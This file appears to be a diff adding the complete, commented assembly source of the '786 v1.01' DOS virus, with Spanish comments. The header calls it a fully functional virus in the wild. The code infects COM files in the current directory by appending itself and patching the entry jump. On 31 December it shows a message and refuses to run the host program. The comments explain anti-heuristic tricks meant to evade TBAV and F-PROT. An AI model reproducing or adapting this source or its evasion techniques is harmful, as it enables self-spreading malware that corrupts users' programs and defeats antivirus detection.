@@ -1,0 +1,312 @@
+;Fuente del 786 v1.01..
+;------------------------------------------------------------------------------
+;NOTA: ESTE ES UN VIRUS COMPLETAMENTE FUNCIONAL Y EN VIGENCIA EN LA CALLE.
+;PUBLICADO CON EL CONSENTIMIENTO DE SU AUTOR: VIXER.
+;Bueno, este es un virus sencillo, pero lo que no quita que sea efectivo.
+;Este fuente es el fuente original del virus, NO un desensamblado, pero hemos
+;decidido comentarlo un poco mas, cosa de que se haga la tarea un poco mas sen_
+;cilla.
+;Este es un virus no_residente, el cual infecta 1 archivo del directorio actual
+;cada vez que se ejecuta un file infectado.. No tiene b£squeda transversal de
+;archivos, por lo que su difusi¢n se limita un poco.. Su rango de infeccion se
+;limita a archivos COM nada mas.. Pero tiene tambien puntos a su favor.. :-)
+;En sus momentos, evadia totalmente al Thunderbyte y a otros antivirus..
+;Pero bueno, tampoco esperen 'EL' virus de primera. :-) Conociendo como funcio_
+;nan los virus mas sencillos, despues se hace mucho mas facil entender virus
+;mas complejos.. Bueno, llendo al virus en si, trabaja de la siguiente manera :
+;------------------------------------------------------------------------------
+; /~~~\
+;/ÄÄÄÄÄ\
+;³     ³ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³     ³³ ViRuS 786 v1.01 --> por û­Xäâ                               ÚÙ
+;³     Ã´~~~~~~~^^^~~~~~~~~~~~~~~~^^^^^~                             ÚÙ
+;³     ³³                                                           ÚÙ
+;³     Ã´Caracteristicas: -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-ÚÙ
+;³     ³³  -No residente                                          ÚÙ
+;³     Ã´  -Appending                                            ÚÙ
+;³     ³³  -No reinfecta files                                  ÚÙ
+;³     Ã´ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+;³     ³³  -Infecta al final del file                           À¿
+;³     Ã´  -Manda un mensaje el 31 de diciembre                  À¿
+;³     ³³  -Virulencia: 1 en 1                                    À¿
+;³     Ã´  -Busca files en current path -=-=-=-=-=-=-=-=-=-=-=-=-=-À¿
+;³     ³³  -Tecnicas anti-heuristicas                               À¿
+;³     Ã´  ^(No lo detecta el TBAV en modo HIGH ni el F-PROT)        À¿
+;³     ³³                                                             À¿
+;³     ³³  /* Creado el 1 de Junio de 1994 */                          À¿
+;³     ³ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+;³     ³
+;³     ³
+;³     ³
+;³     ³
+
+.286c
+Codigo  Segment 'code'
+	org 100h
+        Assume cs:Codigo, ds:Codigo, es:Codigo
+
+Start   Proc Far
+
+        jmp     Comienzo                ;JMP 3 bytes al virus
+        db      "V"                     ;Marca de infecion
+        nop
+        nop                             ;Supuesto prog. infectado (host)
+        mov     ax, 04c00h
+        int     21h
+
+
+;AQUI COMIENZA EL VIRUS EN SI--------------------------------------------------
+Comienzo:                               ;Desde aqui comienza el Virus
+        push    cs
+        push    cs
+        pop     ds
+        pop     es
+                                         
+        call    Proc_falso              ;Llama a Proc_falso para que quede
+Proc_falso      proc near               ;en el stack el reg. IP
+Proc_falso      endp
+
+        mov     di, sp                  ;Esto es equivalente a POP BP
+        mov     bp, word ptr ss:[di]    ;SUB BP, OFFSET PROC_FALSO
+        sub     bp, offset Proc_falso   ;Esto es una tecnica anti-heuristica
+        add     sp, 02d
+
+;Lo primero que hace al ejecutarse, es obtener su posicion en el file por medio
+;del calculo del offset á. Una vez que sabe donde esta parado el virus, hace
+;referencia a sus propias variables de forma relativa a bp..
+;------------------------------------------------------------------------------
+
+        mov     cx, 43d                 ;Salva DTA original
+        lea     di, bp + DTA_orig
+        mov     si, 0080h
+        rep     movsb
+
+;Lo que hace el virus en este momento, es salvar el DTA del programa infectado.
+;Esto lo hacemos porque al buscar un file cualquiera para infectar con la fun_
+;ci¢n 4eh (Buscar la primera entrada) ¢ 4fh (Buscar la pr¢xima entrada), se nos
+;destruyen los datos que teniamos en el DTA original y se nos actualiza con los
+;datos del archivo encontrado por medio de estas funciones. Esos datos son uti_
+;lizados por el programa anfitri¢n, osea que al ser sobreescritos con los datos
+;del file nuevo, el programa hace cualquiera.. Generalmente no se cuelga la ma_
+;quina ni nada de eso, pero el programa saca datos de ahi como parametros y bo_
+;ludeces asi, osea que el programa sale al DOS con error..
+;------------------------------------------------------------------------------
+        jmp     Check_PlayLoad          ;Claro que no ejecuta los datos
+	;-------------------------------------------------------------
+DTA_orig        db 43d dup (0)          ;Espacio para el DTA
+Jump            db 0e9h                 ;JUMP
+Firma           db "V"                  ;Firma del Virus
+Longitud        db 2 dup (0)
+Bytes_Orig      db 090h, 090h, 090h, 090h  ;Originales del prog. infectado
+File_busc       db "*.C?M", 0
+                ;Busca *.C?M y no *.COM. Es otra tecnica anti-heuristica
+
+Mensaje db 0ah,0dh
+        db "Este es el virus 786 Version 1 ", 0ah, 0dh          ;Mensaje
+        db "Echo por --> û­xäâ [ûxâ]/A.H.D. HALKA/. Industria Argentina", 0ah, 0dh
+        db "Quemen al mu¤eco del `94!", 0ah, 0dh
+
+        db  "$  OHH NO, ME HA DESCUBIERTO!!!", 0ah, 0dh   ;String
+;------------------------------------------------------------------------------
+
+Check_PlayLoad:
+        mov     ah, 02ah                ;Chequea si es diciembre
+        int     021h
+
+        cmp     dh, 12d
+        jne     No_Playload
+
+        cmp     dl, 31                  ;Chequea si es 31
+        jne     No_Playload
+
+;Aca se verifica si el mes de ejecuci¢n del file es Diciembre.. Esto se hace
+;pidiendole la fecha al sistema con el servicio 2ah de la int 21h... Este ser_
+;vicio nos devuelve el mes actual en DH, osea que lo comparo con el mes 12 (Di_
+;ciembre :-).. si es el mes correcto, me fijo si es fin de a¤o (31 de Dic.),
+;comparando DL con 31.. Donde DL contiene el dia actual.. En caso de que sea
+;la fecha deseada, se ejecuta el playload, ¢ carga ¢ 'detonaci¢n' del virus.
+;Como el 786 v1.01 es un virus ben‚volo, solo mostrara un mensaje y no dejara
+;que se siga ejecutando el file infectado saliendo al DOS..
+;En caso de que NO sea la fecha deseada, se salta a la etiqueta NO_PLAYLOAD,
+;en donde se intenta infectar otro archivo..
+;------------------------------------------------------------------------------
+        mov     ax, 0900h               ;Es 31 de diciembre, mostrar mensaje!
+        lea     dx, bp + Mensaje
+        int     021h
+
+        mov     ax, 04c00h              ;Y no ejecuta el prog. infectado
+        int     021h
+
+No_Playload:
+        cld                             ;Restaura los 4 primeros bytes del prog
+        mov     cx, 4d                  ;infectado
+        mov     di, 0100h
+        lea     si, bp + Bytes_Orig
+        rep     movsb
+
+;Con este c¢digo estoy restituyendo los primeros bytes del programa original,
+;los que son sobreescritos con el objeto de darle el control a nuestro virus..
+;Nosotros al infectar un file, y para que una vez que se ejecute el file, que
+;nuestro virus sea el que PRIMERO tome el control, sobreescribimos los primeros
+;bytes del programa con un 'éXX' donde el é es el ASCII del jump, y XX la di_
+;reccion del salto... justamente la direccion de nuestro virus.. Bueno, todo
+;esto perfecto, pero cuando le queremos devolver el control al programa origi_
+;nal, con que nos encontramos ? Que hubiera estado piola guardar los primeros
+;bytes del codigo original ;). Asi cuando le querramos dar el control, lo unico
+;que necesitariamos es reemplazar los primeros bytes 'truchos' por los buenos,
+;y saltar al offset 100h (De donde se carga todo el c¢digo ejecutable de TODOS
+;los COM).
+;------------------------------------------------------------------------------
+
+Buscar_File:
+        mov     ax, 04e00h              ;Busca primer file del directorio
+        mov     cx, 0
+        lea     dx, File_busc + bp
+        int     021h
+        jnb     Hay_files               ;Salta si hay *.C?M
+
+;Bueno, entonces busco el primer COM del directorio.. Si encuentro algun file
+;joya, salto a HAY_FILES y me fijo si esta infectado.. Si no hay ningun file, 
+;le devuelvo el control al COM sin infectar nada y listo... mala leche :( ;)
+;------------------------------------------------------------------------------
+
+Retornar:                               ;No hay *.C?M
+        mov     cx, 43d                 ;Restaura el DTA original
+        lea     si, bp + DTA_orig
+        mov     di, 0080h
+        rep     movsb
+
+        push    0100h                   ;Ejecuta el prog. infectado
+        pop     ax                      ;Esto es igual que JMP 0100h
+        jmp     ax                      ;Es una tecnica anti-heuristica
+
+;Bueno, aca esta lo que decia antes sobre el DTA... Antes de ejecutar el file
+;lo dejo como estaba ANTES de buscar los COM.. Y listo... ahora hago el salto
+;al offset 100h, y ya esta... le di el control al COM anfitrion ;)
+;------------------------------------------------------------------------------
+
+Hay_files:
+        mov     ax, 03d02h
+        mov     dx, 0009eh              ;Abre el file encontrado
+	int	021h
+        push    ax
+        pop     bx
+        push    bx
+        mov     ax, 03f00h              ;Lee los 4 bytes primeros
+        mov     cx, 0004h
+        lea     dx, Bytes_Orig + bp     ;Y los guarda en Bytes_Orig
+        int     021h
+
+        mov     cl, byte ptr cs:[bytes_orig + bp+3] ;Verifica si esta infectado
+        cmp     cl, Firma + bp
+        jne     Infectar
+
+;Con este codigo verifico si el file recien encontrado YA estaba infectado.. 
+;Lo que hago es abrir el file, comparar el 4to byte con 'û' y si coinciden es
+;porque el archivo estaba infectado.. No es conveniente chequear con UN solo
+;byte, ya que corremos el riesgo de que el file NO estubiese infectado, pero
+;por una de esas casualidades, tenga en su 4to byte un 'û'.. Entonces el virus
+;cree que ya estaba infectado y no lo infecta..
+;Si la comparacion NO da Cero, osea que NO era 'û', se prepara para infectar el
+;file.. (salta a INFECTAR)... sinom osea que ESTABA infectado, sigue buscando
+;otro file... pero antes cierra el file que habia abierto..
+;------------------------------------------------------------------------------
+
+Proximo_File:
+        pop     bx                      ;Esta infectado. Busca otro
+        mov     ah, 03eh
+        int     021h                    ;Cierra el file anterior
+
+        mov     ah, 04fh
+        int     021h
+        jb      Retornar                ;Si salta no hay mas files
+        jmp     Hay_files
+
+;Aca busca otro file.. si salta por el JB (jump below), es que no habia mas COM
+;en el directorio y no busca mas.. sino, es que encontr¢ otro file y vuelve a
+;verificar si ya estaba infectado.. (JMP HAY_FILES)
+;------------------------------------------------------------------------------
+
+Infectar:                               ;Infecta el file!
+        pop     bx
+        push    bx
+        mov     ax, 04200h              ;Mueve el puntero de lecto/escritura
+                                        ;(LSEEK) al principio del prog.
+        mov     cx, 0
+        mov     dx, 0
+        int     021h
+
+        pop     bx                      ;Escrive el jmp para el Virus
+        push    bx
+        mov     ah, 040h
+        mov     cx, 1
+        lea     dx, Jump + bp
+        int     021h
+
+        mov     cx, 2                   ;Calcula el jmp para el virus
+        mov     si, 009ah               ;(longitud del prog. + 1)
+        lea     di, bp + Longitud
+        rep     movsb
+        add     Longitud + bp,1
+
+        pop     bx                      ;Graba el resultado del
+        push    bx                      ;calculo anterior
+        mov     ah, 040h
+        mov     cx, 2
+        lea     dx, Longitud + bp
+        int     021h
+
+        pop     bx                      ;Escribe la marca de infeccion
+        push    bx
+        mov     ah, 040h
+        mov     cx, 1
+        lea     dx, bp + Firma
+        int     021h
+
+        pop     bx
+        push    bx
+        mov     ax, 04202h              ;Mueve el puntero de lecto/escritura
+                                        ;(LSEEK) al final del prog.
+        mov     cx, 0
+        mov     dx, 0
+        int     021h
+
+        mov     cx, 43d                 ;Restaura el DTA original
+        lea     si, bp + DTA_orig
+        mov     di, 0080h
+        rep     movsb
+
+        mov     cx,43d                  ;Borra la variable DTA_orig
+        lea     bx, DTA_orig + bp       ;Esto sirve para no crear
+DTA_clr:                                ;falsas alarmas en los anti-virus
+        mov     byte ptr [bx],0         ;heuristicos
+        inc     bx
+        loop    DTA_clr
+
+        pop     bx                      ;Escrive el virus en el file
+        push    bx
+        mov     ah, 040h
+        mov     cx, 1000d               ;El virus mide 512d bytes. Pero
+        lea     dx, bp + Comienzo       ;le graba 1000d porque es menos
+        int     021h                    ;notorio 
+
+        pop     bx                      ;Ya infecto el prog!
+        mov     ah, 03eh                ;Ahora lo cierra
+        int     021h
+
+        push    0100h                   ;Ejecuta el prog. host
+        pop     ax                      ;Esto es igual a JMP 0100h
+        jmp     ax                      ;Es una tecnica anti-heuristica
+
+
+start endp
+codigo ends
+end start
+
+;---> Este û­âu$ NO es Number_of_the_beast! <---
+
+;ACLR: El TBAV y el F-PROT no lo detectan con busqueda heuristica, pero
+;      si puede ser detectado con strings de busqueda.
+;ACLR2:Si les interesa el fuente ORIGINAL del virus, se encuentra disponible
+;      en cualquiera de los BBS que figuran en la lista..
+;------------------------------------------------------------------------------
